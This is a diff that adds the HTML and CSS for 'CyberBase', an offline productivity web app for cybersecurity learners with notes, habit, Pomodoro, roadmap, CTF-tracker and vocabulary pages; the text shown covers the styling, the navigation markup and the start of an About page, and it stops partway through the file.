@@ -1,0 +1,2197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberBase — Your Hacker Productivity OS</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c10;
+    --surface: #0f1319;
+    --surface2: #161b24;
+    --border: #1e2a3a;
+    --accent: #00ff88;
+    --accent2: #00c4ff;
+    --accent3: #ff4d6d;
+    --accent4: #ffd700;
+    --text: #c8d8e8;
+    --text2: #6a8aa8;
+    --glow: 0 0 20px rgba(0,255,136,0.3);
+    --glow2: 0 0 20px rgba(0,196,255,0.3);
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 15px;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+  /* Scanline overlay */
+  body::before {
+    content:'';
+    position:fixed;
+    top:0;left:0;right:0;bottom:0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,136,0.01) 2px, rgba(0,255,136,0.01) 4px);
+    pointer-events:none;
+    z-index:9999;
+  }
+
+  /* HEADER */
+  .header {
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:14px 28px;
+    border-bottom: 1px solid var(--border);
+    background: rgba(10,12,16,0.95);
+    position:sticky;
+    top:0;
+    z-index:100;
+  }
+  .logo {
+    font-family:'Orbitron',monospace;
+    font-weight:900;
+    font-size:20px;
+    color: var(--accent);
+    text-shadow: var(--glow);
+    letter-spacing:2px;
+  }
+  .logo span { color: var(--accent2); }
+  .nav {
+    display:flex;
+    gap:4px;
+  }
+  .nav-btn {
+    background:none;
+    border: 1px solid transparent;
+    color: var(--text2);
+    font-family:'Rajdhani',sans-serif;
+    font-size:13px;
+    font-weight:600;
+    padding:7px 16px;
+    cursor:pointer;
+    letter-spacing:1px;
+    text-transform:uppercase;
+    border-radius:4px;
+    transition:all 0.2s;
+  }
+  .nav-btn:hover { color:var(--accent); border-color:var(--border); }
+  .nav-btn.active {
+    color:var(--accent);
+    border-color:var(--accent);
+    background:rgba(0,255,136,0.07);
+    box-shadow: var(--glow);
+  }
+  .status-bar {
+    font-family:'Share Tech Mono',monospace;
+    font-size:11px;
+    color:var(--text2);
+  }
+  .status-bar span { color:var(--accent); }
+
+  /* MAIN */
+  .main { padding:24px 28px; max-width:1400px; margin:0 auto; }
+  .page { display:none; }
+  .page.active { display:block; }
+
+  /* SECTION TITLE */
+  .section-title {
+    font-family:'Orbitron',monospace;
+    font-size:13px;
+    letter-spacing:3px;
+    color:var(--text2);
+    text-transform:uppercase;
+    margin-bottom:16px;
+    display:flex;
+    align-items:center;
+    gap:10px;
+  }
+  .section-title::after {
+    content:'';
+    flex:1;
+    height:1px;
+    background: linear-gradient(90deg, var(--border), transparent);
+  }
+
+  /* GRID LAYOUTS */
+  .grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:20px; }
+  .grid-3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:20px; }
+  .grid-auto { display:grid; grid-template-columns:repeat(auto-fill,minmax(280px,1fr)); gap:16px; }
+
+  /* CARDS */
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius:8px;
+    padding:20px;
+    position:relative;
+    overflow:hidden;
+  }
+  .card::before {
+    content:'';
+    position:absolute;
+    top:0;left:0;right:0;
+    height:2px;
+    background: linear-gradient(90deg, var(--accent), transparent);
+  }
+  .card-blue::before { background: linear-gradient(90deg, var(--accent2), transparent); }
+  .card-red::before { background: linear-gradient(90deg, var(--accent3), transparent); }
+  .card-gold::before { background: linear-gradient(90deg, var(--accent4), transparent); }
+
+  /* INPUTS */
+  input, textarea, select {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family:'Rajdhani',sans-serif;
+    font-size:14px;
+    padding:9px 12px;
+    border-radius:4px;
+    outline:none;
+    width:100%;
+    transition:border-color 0.2s;
+  }
+  input:focus, textarea:focus, select:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 2px rgba(0,255,136,0.1);
+  }
+  input::placeholder, textarea::placeholder { color:var(--text2); }
+  textarea { resize:vertical; min-height:80px; }
+
+  /* BUTTONS */
+  .btn {
+    background: rgba(0,255,136,0.1);
+    border: 1px solid var(--accent);
+    color: var(--accent);
+    font-family:'Rajdhani',sans-serif;
+    font-weight:700;
+    font-size:13px;
+    padding:9px 18px;
+    border-radius:4px;
+    cursor:pointer;
+    letter-spacing:1px;
+    text-transform:uppercase;
+    transition:all 0.2s;
+  }
+  .btn:hover { background:rgba(0,255,136,0.2); box-shadow:var(--glow); }
+  .btn-blue { background:rgba(0,196,255,0.1); border-color:var(--accent2); color:var(--accent2); }
+  .btn-blue:hover { background:rgba(0,196,255,0.2); box-shadow:var(--glow2); }
+  .btn-red { background:rgba(255,77,109,0.1); border-color:var(--accent3); color:var(--accent3); }
+  .btn-red:hover { background:rgba(255,77,109,0.2); }
+  .btn-sm { padding:5px 12px; font-size:11px; }
+  .btn-ghost { background:none; border-color:var(--border); color:var(--text2); }
+  .btn-ghost:hover { border-color:var(--text2); color:var(--text); box-shadow:none; }
+
+  /* TAG */
+  .tag {
+    display:inline-block;
+    font-family:'Share Tech Mono',monospace;
+    font-size:10px;
+    padding:2px 8px;
+    border-radius:2px;
+    letter-spacing:1px;
+  }
+  .tag-green { background:rgba(0,255,136,0.1); color:var(--accent); border:1px solid rgba(0,255,136,0.3); }
+  .tag-blue { background:rgba(0,196,255,0.1); color:var(--accent2); border:1px solid rgba(0,196,255,0.3); }
+  .tag-red { background:rgba(255,77,109,0.1); color:var(--accent3); border:1px solid rgba(255,77,109,0.3); }
+  .tag-gold { background:rgba(255,215,0,0.1); color:var(--accent4); border:1px solid rgba(255,215,0,0.3); }
+
+  /* ===================== NOTES PAGE ===================== */
+  .notes-toolbar {
+    display:flex;
+    gap:10px;
+    margin-bottom:20px;
+    align-items:center;
+    flex-wrap:wrap;
+  }
+  .notes-toolbar input { max-width:260px; }
+  .note-type-tabs { display:flex; gap:4px; }
+  .note-type-tab {
+    padding:6px 14px;
+    font-size:12px;
+    font-family:'Share Tech Mono',monospace;
+    border:1px solid var(--border);
+    border-radius:4px;
+    color:var(--text2);
+    cursor:pointer;
+    background:none;
+    letter-spacing:1px;
+    transition:all 0.2s;
+  }
+  .note-type-tab.active { color:var(--accent); border-color:var(--accent); background:rgba(0,255,136,0.07); }
+
+  .notes-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(260px,1fr)); gap:14px; }
+  .note-card {
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:16px;
+    cursor:pointer;
+    transition:all 0.2s;
+    position:relative;
+  }
+  .note-card:hover { border-color:var(--accent2); transform:translateY(-2px); }
+  .note-card-title {
+    font-family:'Orbitron',monospace;
+    font-size:13px;
+    color:var(--accent2);
+    margin-bottom:8px;
+    display:flex;
+    justify-content:space-between;
+    align-items:flex-start;
+    gap:8px;
+  }
+  .note-card-body { font-size:13px; color:var(--text2); line-height:1.5; }
+  .note-card-footer { margin-top:10px; display:flex; justify-content:space-between; align-items:center; }
+  .note-date { font-family:'Share Tech Mono',monospace; font-size:10px; color:#3d5a6a; }
+  .note-actions { display:flex; gap:6px; }
+  .icon-btn {
+    background:none;
+    border:none;
+    cursor:pointer;
+    font-size:14px;
+    padding:2px 5px;
+    border-radius:3px;
+    transition:all 0.2s;
+    color:var(--text2);
+  }
+  .icon-btn:hover { background:rgba(255,255,255,0.05); color:var(--text); }
+
+  /* Note modal */
+  .modal-overlay {
+    position:fixed;
+    top:0;left:0;right:0;bottom:0;
+    background:rgba(0,0,0,0.8);
+    z-index:1000;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    backdrop-filter:blur(4px);
+  }
+  .modal {
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:10px;
+    padding:28px;
+    width:600px;
+    max-width:95vw;
+    max-height:85vh;
+    overflow-y:auto;
+    position:relative;
+  }
+  .modal-title {
+    font-family:'Orbitron',monospace;
+    font-size:14px;
+    color:var(--accent);
+    margin-bottom:20px;
+    letter-spacing:2px;
+  }
+  .modal-close {
+    position:absolute;
+    top:16px;right:16px;
+    background:none;border:none;
+    color:var(--text2);font-size:20px;
+    cursor:pointer;
+  }
+  .modal-close:hover { color:var(--accent3); }
+  .form-row { margin-bottom:14px; }
+  .form-label {
+    font-family:'Share Tech Mono',monospace;
+    font-size:11px;
+    color:var(--text2);
+    letter-spacing:1px;
+    margin-bottom:6px;
+    display:block;
+  }
+  .form-row-inline { display:flex; gap:10px; }
+
+  /* Checklist */
+  .checklist-items { list-style:none; margin:10px 0; }
+  .checklist-item {
+    display:flex;
+    align-items:center;
+    gap:10px;
+    padding:7px 0;
+    border-bottom:1px solid var(--border);
+  }
+  .checklist-item:last-child { border-bottom:none; }
+  .check-box {
+    width:16px;height:16px;
+    border:1px solid var(--accent);
+    border-radius:2px;
+    cursor:pointer;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    flex-shrink:0;
+    font-size:10px;
+    color:var(--accent);
+    transition:all 0.2s;
+  }
+  .check-box.checked { background:rgba(0,255,136,0.2); }
+  .check-label { flex:1; font-size:13px; }
+  .check-label.done { text-decoration:line-through; color:var(--text2); }
+  .add-check-row { display:flex; gap:8px; margin-top:8px; }
+
+  /* ===================== HABITS PAGE ===================== */
+  .habits-top { display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:20px; gap:20px; flex-wrap:wrap; }
+  .streak-summary {
+    display:flex;
+    gap:16px;
+    flex-wrap:wrap;
+  }
+  .streak-stat {
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:14px 20px;
+    text-align:center;
+    min-width:100px;
+  }
+  .streak-num {
+    font-family:'Orbitron',monospace;
+    font-size:28px;
+    font-weight:900;
+    color:var(--accent);
+    line-height:1;
+  }
+  .streak-label { font-size:11px; color:var(--text2); margin-top:4px; letter-spacing:1px; text-transform:uppercase; font-family:'Share Tech Mono',monospace; }
+
+  .habit-card {
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:8px;
+    padding:18px;
+    margin-bottom:12px;
+  }
+  .habit-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:12px; }
+  .habit-name { font-size:16px; font-weight:700; color:var(--text); }
+  .habit-meta { display:flex; gap:8px; align-items:center; }
+  .habit-streak { font-family:'Orbitron',monospace; font-size:18px; color:var(--accent4); font-weight:700; }
+  .habit-grid { display:flex; gap:3px; flex-wrap:wrap; }
+  .habit-day {
+    width:14px;height:14px;
+    border-radius:2px;
+    background:var(--surface2);
+    border:1px solid var(--border);
+    cursor:pointer;
+    transition:all 0.2s;
+    position:relative;
+  }
+  .habit-day.done { background:var(--accent); border-color:var(--accent); box-shadow:0 0 6px rgba(0,255,136,0.5); }
+  .habit-day.today { border-color:var(--accent2); box-shadow:0 0 4px rgba(0,196,255,0.5); }
+  .habit-today-btn {
+    background:rgba(0,255,136,0.1);
+    border:1px solid var(--accent);
+    color:var(--accent);
+    font-family:'Share Tech Mono',monospace;
+    font-size:11px;
+    padding:5px 12px;
+    border-radius:3px;
+    cursor:pointer;
+    letter-spacing:1px;
+    transition:all 0.2s;
+  }
+  .habit-today-btn.checked { background:rgba(0,255,136,0.25); }
+  .habit-today-btn:hover { background:rgba(0,255,136,0.2); }
+  .habit-progress-bar {
+    height:4px;
+    background:var(--surface2);
+    border-radius:2px;
+    margin-top:10px;
+    overflow:hidden;
+  }
+  .habit-progress-fill {
+    height:100%;
+    background: linear-gradient(90deg, var(--accent), var(--accent2));
+    border-radius:2px;
+    transition:width 0.5s ease;
+  }
+
+  /* ===================== POMODORO PAGE ===================== */
+  .pomo-center { display:flex; flex-direction:column; align-items:center; padding:20px 0; }
+  .pomo-ring-wrap {
+    position:relative;
+    width:280px;height:280px;
+    margin:20px 0;
+  }
+  .pomo-ring {
+    transform:rotate(-90deg);
+  }
+  .pomo-ring-bg { fill:none; stroke:var(--surface2); stroke-width:12; }
+  .pomo-ring-fill { fill:none; stroke-width:12; stroke-linecap:round; transition:stroke-dashoffset 0.5s linear, stroke 0.5s; }
+  .pomo-time {
+    position:absolute;
+    top:50%;left:50%;
+    transform:translate(-50%,-50%);
+    text-align:center;
+  }
+  .pomo-digits {
+    font-family:'Orbitron',monospace;
+    font-size:54px;
+    font-weight:900;
+    color:var(--text);
+    line-height:1;
+    text-shadow: 0 0 30px rgba(0,255,136,0.3);
+  }
+  .pomo-mode-label {
+    font-family:'Share Tech Mono',monospace;
+    font-size:12px;
+    color:var(--text2);
+    letter-spacing:2px;
+    margin-top:4px;
+  }
+  .pomo-session { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--accent4); letter-spacing:1px; margin-top:4px; }
+  .pomo-controls { display:flex; gap:12px; margin-top:10px; }
+  .pomo-btn-big {
+    width:64px;height:64px;
+    border-radius:50%;
+    border:2px solid var(--accent);
+    background:rgba(0,255,136,0.08);
+    color:var(--accent);
+    font-size:24px;
+    cursor:pointer;
+    transition:all 0.2s;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+  .pomo-btn-big:hover { background:rgba(0,255,136,0.2); box-shadow:var(--glow); }
+  .pomo-btn-big.pause { border-color:var(--accent4); color:var(--accent4); background:rgba(255,215,0,0.08); }
+  .pomo-btn-big.stop { border-color:var(--accent3); color:var(--accent3); background:rgba(255,77,109,0.08); }
+  .pomo-modes { display:flex; gap:8px; margin-bottom:10px; }
+  .pomo-mode-btn {
+    background:none;
+    border:1px solid var(--border);
+    color:var(--text2);
+    font-family:'Share Tech Mono',monospace;
+    font-size:11px;
+    padding:6px 16px;
+    border-radius:20px;
+    cursor:pointer;
+    letter-spacing:1px;
+    transition:all 0.2s;
+  }
+  .pomo-mode-btn.active { border-color:var(--accent); color:var(--accent); background:rgba(0,255,136,0.07); }
+  .pomo-settings { display:grid; grid-template-columns:1fr 1fr 1fr; gap:12px; width:100%; max-width:400px; margin:16px 0; }
+  .pomo-set-box { text-align:center; }
+  .pomo-set-label { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--text2); letter-spacing:1px; margin-bottom:4px; }
+  .pomo-set-input {
+    width:70px;
+    text-align:center;
+    font-family:'Orbitron',monospace;
+    font-size:18px;
+    color:var(--accent2);
+    background:var(--surface2);
+    border:1px solid var(--border);
+    border-radius:4px;
+    padding:6px;
+  }
+  .pomo-log { width:100%; max-width:500px; margin-top:20px; }
+  .pomo-log-item {
+    display:flex;
+    justify-content:space-between;
+    padding:8px 12px;
+    border-bottom:1px solid var(--border);
+    font-family:'Share Tech Mono',monospace;
+    font-size:11px;
+  }
+  .pomo-log-item:last-child { border-bottom:none; }
+
+  /* ===================== ROADMAP PAGE ===================== */
+  .roadmap-selector { display:flex; gap:10px; margin-bottom:20px; flex-wrap:wrap; }
+  .roadmap-tab {
+    padding:8px 18px;
+    border:1px solid var(--border);
+    border-radius:4px;
+    color:var(--text2);
+    font-family:'Share Tech Mono',monospace;
+    font-size:11px;
+    cursor:pointer;
+    background:none;
+    letter-spacing:1px;
+    transition:all 0.2s;
+  }
+  .roadmap-tab.active { border-color:var(--accent); color:var(--accent); background:rgba(0,255,136,0.07); }
+
+  .roadmap-timeline { position:relative; padding-left:30px; }
+  .roadmap-timeline::before {
+    content:'';
+    position:absolute;
+    left:10px;top:0;bottom:0;
+    width:2px;
+    background: linear-gradient(180deg, var(--accent), var(--accent2), var(--accent3));
+  }
+  .roadmap-phase {
+    position:relative;
+    margin-bottom:24px;
+  }
+  .roadmap-phase::before {
+    content:'';
+    position:absolute;
+    left:-24px;top:8px;
+    width:10px;height:10px;
+    border-radius:50%;
+    background:var(--accent);
+    border:2px solid var(--bg);
+    box-shadow:0 0 8px var(--accent);
+  }
+  .roadmap-phase.phase-2::before { background:var(--accent2); box-shadow:0 0 8px var(--accent2); }
+  .roadmap-phase.phase-3::before { background:var(--accent4); box-shadow:0 0 8px var(--accent4); }
+  .roadmap-phase.phase-4::before { background:#a855f7; box-shadow:0 0 8px #a855f7; }
+  .roadmap-phase.phase-5::before { background:var(--accent3); box-shadow:0 0 8px var(--accent3); }
+
+  .phase-header {
+    display:flex;
+    align-items:center;
+    gap:12px;
+    margin-bottom:10px;
+  }
+  .phase-time {
+    font-family:'Orbitron',monospace;
+    font-size:11px;
+    color:var(--accent4);
+    background:rgba(255,215,0,0.1);
+    border:1px solid rgba(255,215,0,0.3);
+    padding:3px 10px;
+    border-radius:3px;
+    letter-spacing:1px;
+    white-space:nowrap;
+  }
+  .phase-title { font-size:17px; font-weight:700; color:var(--text); }
+  .phase-tasks { list-style:none; }
+  .phase-task {
+    display:flex;
+    align-items:flex-start;
+    gap:10px;
+    padding:7px 10px;
+    border-radius:4px;
+    margin-bottom:4px;
+    font-size:13px;
+    color:var(--text2);
+    cursor:pointer;
+    transition:all 0.2s;
+  }
+  .phase-task:hover { background:rgba(255,255,255,0.03); }
+  .phase-task.done { color:rgba(100,140,120,0.7); }
+  .phase-task.done .task-check { background:rgba(0,255,136,0.2); border-color:var(--accent); color:var(--accent); }
+  .task-check {
+    width:16px;height:16px;
+    border:1px solid var(--border);
+    border-radius:2px;
+    flex-shrink:0;
+    margin-top:1px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:9px;
+  }
+  .phase-resources { display:flex; gap:6px; flex-wrap:wrap; margin-top:8px; padding-left:2px; }
+  .resource-chip {
+    font-family:'Share Tech Mono',monospace;
+    font-size:10px;
+    padding:3px 9px;
+    border-radius:3px;
+    background:rgba(0,196,255,0.07);
+    border:1px solid rgba(0,196,255,0.2);
+    color:var(--accent2);
+    letter-spacing:0.5px;
+  }
+
+  /* ===================== CTF TRACKER ===================== */
+  .ctf-stats { display:grid; grid-template-columns:repeat(4,1fr); gap:12px; margin-bottom:20px; }
+  .ctf-stat {
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:14px;
+    text-align:center;
+  }
+  .ctf-stat-num { font-family:'Orbitron',monospace; font-size:24px; font-weight:900; line-height:1; }
+  .ctf-stat-label { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--text2); margin-top:4px; letter-spacing:1px; }
+  .ctf-list { }
+  .ctf-item {
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:14px 18px;
+    margin-bottom:10px;
+    display:flex;
+    align-items:center;
+    gap:16px;
+  }
+  .ctf-item-name { font-size:15px; font-weight:700; flex:1; }
+  .ctf-item-meta { display:flex; gap:8px; align-items:center; }
+  .ctf-difficulty {
+    font-family:'Share Tech Mono',monospace;
+    font-size:10px;
+    padding:2px 8px;
+    border-radius:2px;
+  }
+  .diff-easy { background:rgba(0,255,136,0.1); color:var(--accent); border:1px solid rgba(0,255,136,0.3); }
+  .diff-med { background:rgba(255,215,0,0.1); color:var(--accent4); border:1px solid rgba(255,215,0,0.3); }
+  .diff-hard { background:rgba(255,77,109,0.1); color:var(--accent3); border:1px solid rgba(255,77,109,0.3); }
+  .ctf-points { font-family:'Orbitron',monospace; font-size:16px; color:var(--accent4); font-weight:700; }
+  .add-ctf-form { background:var(--surface); border:1px solid var(--border); border-radius:8px; padding:20px; margin-bottom:20px; }
+  .form-inline { display:flex; gap:10px; flex-wrap:wrap; align-items:flex-end; }
+  .form-inline .form-row { margin-bottom:0; flex:1; min-width:120px; }
+
+  /* ===================== VOCAB / TOOL REFERENCE ===================== */
+  .vocab-search { display:flex; gap:10px; margin-bottom:16px; }
+  .vocab-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(260px,1fr)); gap:12px; }
+  .vocab-card {
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:14px;
+  }
+  .vocab-term {
+    font-family:'Orbitron',monospace;
+    font-size:13px;
+    color:var(--accent2);
+    margin-bottom:6px;
+  }
+  .vocab-def { font-size:13px; color:var(--text2); line-height:1.5; }
+  .vocab-cat { margin-top:8px; }
+
+  /* ===================== UTILITY ===================== */
+  .flex { display:flex; }
+  .flex-center { display:flex; align-items:center; justify-content:center; }
+  .gap-8 { gap:8px; }
+  .gap-12 { gap:12px; }
+  .mt-8 { margin-top:8px; }
+  .mt-12 { margin-top:12px; }
+  .mt-16 { margin-top:16px; }
+  .mb-8 { margin-bottom:8px; }
+  .mb-12 { margin-bottom:12px; }
+  .w100 { width:100%; }
+  .text-accent { color:var(--accent); }
+  .text-accent2 { color:var(--accent2); }
+  .text-muted { color:var(--text2); }
+  .font-mono { font-family:'Share Tech Mono',monospace; }
+  .font-orb { font-family:'Orbitron',monospace; }
+  .hidden { display:none !important; }
+
+  /* Empty state */
+  .empty-state {
+    text-align:center;
+    padding:60px 20px;
+    color:var(--text2);
+    font-family:'Share Tech Mono',monospace;
+    font-size:13px;
+    letter-spacing:1px;
+  }
+  .empty-icon { font-size:40px; margin-bottom:12px; opacity:0.5; }
+
+  /* Notification toast */
+  .toast {
+    position:fixed;
+    bottom:24px;right:24px;
+    background:var(--surface);
+    border:1px solid var(--accent);
+    color:var(--accent);
+    font-family:'Share Tech Mono',monospace;
+    font-size:12px;
+    padding:10px 20px;
+    border-radius:6px;
+    z-index:9000;
+    box-shadow:var(--glow);
+    animation:slideIn 0.3s ease;
+    letter-spacing:1px;
+  }
+  @keyframes slideIn { from{transform:translateX(100%);opacity:0} to{transform:translateX(0);opacity:1} }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width:6px; height:6px; }
+  ::-webkit-scrollbar-track { background:var(--bg); }
+  ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
+  ::-webkit-scrollbar-thumb:hover { background:var(--text2); }
+
+  /* ===== MOBILE NAV ===== */
+  .hamburger {
+    display:none;
+    background:none;
+    border:1px solid var(--border);
+    color:var(--accent);
+    font-size:20px;
+    padding:6px 10px;
+    border-radius:4px;
+    cursor:pointer;
+    line-height:1;
+  }
+  .mobile-nav-overlay {
+    display:none;
+    position:fixed;
+    top:0;left:0;right:0;bottom:0;
+    background:rgba(0,0,0,0.7);
+    z-index:200;
+    backdrop-filter:blur(4px);
+  }
+  .mobile-nav-overlay.open { display:block; }
+  .mobile-nav-drawer {
+    position:fixed;
+    top:0;left:0;bottom:0;
+    width:260px;
+    background:var(--surface);
+    border-right:1px solid var(--border);
+    z-index:201;
+    padding:20px 16px;
+    transform:translateX(-100%);
+    transition:transform 0.25s ease;
+    overflow-y:auto;
+  }
+  .mobile-nav-drawer.open { transform:translateX(0); }
+  .mobile-nav-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:24px; }
+  .mobile-nav-logo { font-family:'Orbitron',monospace; font-size:18px; color:var(--accent); font-weight:900; letter-spacing:2px; }
+  .mobile-nav-close { background:none; border:none; color:var(--text2); font-size:22px; cursor:pointer; padding:4px; }
+  .mobile-nav-close:hover { color:var(--accent3); }
+  .mobile-nav-btn {
+    display:flex; align-items:center; gap:10px;
+    width:100%; background:none; border:none;
+    color:var(--text2); font-family:'Rajdhani',sans-serif;
+    font-size:15px; font-weight:600; padding:12px 10px;
+    border-radius:6px; cursor:pointer; text-align:left;
+    letter-spacing:1px; text-transform:uppercase;
+    border-bottom:1px solid var(--border); transition:all 0.2s;
+  }
+  .mobile-nav-btn:hover, .mobile-nav-btn.active { color:var(--accent); background:rgba(0,255,136,0.07); }
+  .mobile-nav-btn:last-child { border-bottom:none; }
+  .mobile-clock { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--accent); margin-top:20px; text-align:center; padding:8px; border:1px solid var(--border); border-radius:4px; }
+
+  /* ===== RESPONSIVE BREAKPOINTS ===== */
+  @media (max-width: 768px) {
+    .header { padding:10px 16px; }
+    .nav { display:none; }
+    .status-bar { display:none !important; }
+    .hamburger { display:block; }
+    .main { padding:16px 12px; }
+    .grid-2 { grid-template-columns:1fr !important; }
+    .grid-3 { grid-template-columns:1fr !important; }
+    .notes-grid { grid-template-columns:1fr !important; }
+    .vocab-grid { grid-template-columns:1fr !important; }
+    .grid-auto { grid-template-columns:1fr !important; }
+    .pomo-ring-wrap { width:220px !important; height:220px !important; }
+    .pomo-ring { width:220px !important; height:220px !important; }
+    .pomo-digits { font-size:40px !important; }
+    .pomo-settings { grid-template-columns:1fr 1fr 1fr; max-width:100% !important; }
+    .modal { width:95vw !important; padding:18px !important; }
+    .notes-toolbar { flex-wrap:wrap; gap:8px; }
+    .notes-toolbar input { max-width:100% !important; width:100%; }
+    .habits-top { flex-direction:column; gap:12px; }
+    .streak-summary { flex-wrap:wrap; }
+    .ctf-stats { grid-template-columns:1fr 1fr !important; }
+    .vocab-search { flex-wrap:wrap; }
+    .vocab-search input { width:100% !important; }
+    .form-row-inline { flex-direction:column; }
+    .form-inline { flex-direction:column; gap:8px; }
+    .roadmap-selector { flex-wrap:wrap; }
+    .habit-card { padding:14px; }
+    .section-title { font-size:11px; letter-spacing:2px; }
+    .card { padding:14px; }
+    .logo { font-size:16px; }
+    .pomo-btn-big { width:54px !important; height:54px !important; font-size:20px !important; }
+    .add-ctf-form .form-inline { display:flex; flex-direction:column; }
+    [style*="grid-template-columns:1fr 1fr"] { display:block !important; }
+    .roadmap-timeline { padding-left:20px; }
+  }
+  @media (max-width: 480px) {
+    .pomo-ring-wrap { width:180px !important; height:180px !important; }
+    .pomo-ring { width:180px !important; height:180px !important; }
+    .pomo-digits { font-size:34px !important; }
+    .main { padding:12px 10px; }
+    .ctf-stats { grid-template-columns:1fr 1fr !important; }
+    .vocab-search select { width:100% !important; }
+  }
+</style>
+</head>
+<body>
+
+<!-- MOBILE NAV OVERLAY + DRAWER -->
+<div class="mobile-nav-overlay" id="mobileNavOverlay" onclick="closeMobileNav()"></div>
+<div class="mobile-nav-drawer" id="mobileNavDrawer">
+  <div class="mobile-nav-header">
+    <span class="mobile-nav-logo">CYBER<span style="color:var(--accent2)">BASE</span></span>
+    <button class="mobile-nav-close" onclick="closeMobileNav()">✕</button>
+  </div>
+  <button class="mobile-nav-btn" data-page="notes" onclick="showPage('notes');closeMobileNav()">📝 Notes</button>
+  <button class="mobile-nav-btn" data-page="habits" onclick="showPage('habits');closeMobileNav()">🔥 Habits</button>
+  <button class="mobile-nav-btn" data-page="pomodoro" onclick="showPage('pomodoro');closeMobileNav()">⏱ Pomodoro</button>
+  <button class="mobile-nav-btn" data-page="roadmap" onclick="showPage('roadmap');closeMobileNav()">🗺 Roadmap</button>
+  <button class="mobile-nav-btn" data-page="ctf" onclick="showPage('ctf');closeMobileNav()">🏴 CTF</button>
+  <button class="mobile-nav-btn" data-page="vocab" onclick="showPage('vocab');closeMobileNav()">📖 Vocab</button>
+  <div class="mobile-clock" id="mobileClockDisplay">--:--:--</div>
+</div>
+
+<!-- HEADER -->
+<div class="header">
+  <div class="logo" onclick="showPage('about')" style="cursor:pointer;">CYBER<span>BASE</span></div>
+  <nav class="nav">
+    <button class="nav-btn active" data-page="notes" onclick="showPage('notes')">📝 Notes</button>
+    <button class="nav-btn" data-page="habits" onclick="showPage('habits')">🔥 Habits</button>
+    <button class="nav-btn" data-page="pomodoro" onclick="showPage('pomodoro')">⏱ Pomodoro</button>
+    <button class="nav-btn" data-page="roadmap" onclick="showPage('roadmap')">🗺 Roadmap</button>
+    <button class="nav-btn" data-page="ctf" onclick="showPage('ctf')">🏴 CTF</button>
+    <button class="nav-btn" data-page="vocab" onclick="showPage('vocab')">📖 Vocab</button>
+  </nav>
+  <div class="status-bar" id="statusBar" style="display:flex;align-items:center;gap:10px;">
+    <span>SYS: <span style="color:var(--accent)">ONLINE</span></span>
+    <span style="color:var(--border)">|</span>
+    <span id="clockDisplay" style="color:var(--accent)"></span>
+  </div>
+  <button class="hamburger" onclick="openMobileNav()">☰</button>
+</div>
+
+<div class="main">
+
+<!-- =================== ABOUT PAGE =================== -->
+<div class="page" id="page-about">
+  <div style="max-width:800px;margin:0 auto;padding:20px 0;">
+    <div style="text-align:center;margin-bottom:40px;">
+      <div class="font-orb" style="font-size:48px;color:var(--accent);text-shadow:var(--glow);letter-spacing:4px;">CYBER<span style="color:var(--accent2);">BASE</span></div>
+      <div class="font-mono" style="font-size:13px;color:var(--text2);margin-top:8px;letter-spacing:3px;">YOUR HACKER PRODUCTIVITY OS</div>
+      <div style="width:60px;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2));margin:16px auto;"></div>
+    </div>
+    <div class="card" style="margin-bottom:16px;">
+      <div class="section-title">ABOUT THE APP</div>
+      <div style="font-size:15px;line-height:1.8;color:var(--text);">
+        CyberBase is a free, all-in-one productivity app built specifically for cybersecurity students, ethical hackers, and anyone on a learning journey. No accounts, no subscriptions, no internet required after first load — everything saves locally on your device.
+        <br><br>
+        Whether you're grinding TryHackMe, preparing for eJPT, doing bug bounty, or just trying to stay consistent with your learning — CyberBase keeps you organized, focused, and on track.
+      </div>
+    </div>
+    <div class="grid-2" style="margin-bottom:16px;">
+      <div class="card card-blue">
+        <div class="section-title">FEATURES</div>
+        <div style="font-size:13px;color:var(--text2);line-height:2;">
+          📝 Notes &amp; Checklists<br>
+          🔥 Habit Tracker with Streaks<br>
+          ⏱ Pomodoro Timer<br>
+          🗺 Custom Roadmap Builder<br>
+          🏴 CTF Challenge Tracker<br>
+          📖 500+ Cyber Vocab Reference
+        </div>
+      </div>
+      <div class="card card-gold">
+        <div class="section-title">TECH STACK</div>
+        <div style="font-size:13px;color:var(--text2);line-height:2;">
+          🌐 Vanilla HTML, CSS, JavaScript<br>
+          💾 localStorage (offline-first)<br>
